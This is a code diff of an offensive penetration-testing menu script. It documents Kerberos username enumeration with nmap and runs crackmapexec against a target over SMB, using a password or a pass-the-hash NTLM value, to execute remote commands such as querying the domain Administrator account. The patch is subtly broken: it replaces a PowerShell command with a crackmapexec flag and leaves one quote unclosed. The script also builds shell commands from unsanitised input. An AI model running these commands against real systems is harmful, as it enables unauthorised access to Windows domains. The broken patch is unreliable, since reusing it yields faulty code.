@@ -1817,6 +1817,7 @@ while True:
 # Version : Pr0J3CT_M@k30V3r                                                               
 # Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
 # Modified: N/A
+# Notes   : Still dealing with duplicates very well!!?
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
@@ -1857,6 +1858,7 @@ while True:
                                 line2 = line2.rstrip("\n")
                                 if line2 != checkuser:
                                    line2 = line2.replace("$", "\$")
+
                                    command("echo " + line2 + " >> newusers.tmp")
                         read2.close()
                   
@@ -2372,7 +2374,7 @@ while True:
          
             print("\n[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X '\$PSVersionTable'")         
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X '--lusers")         
          else:
             print("[i] Using HASH value as password credential")
             print("[*] Enumerating, please wait...")          
@@ -2388,7 +2390,7 @@ while True:
          
             print("\n[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X '\$PSVersionTable'")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X '--lusers'")
             
       prompt()
 
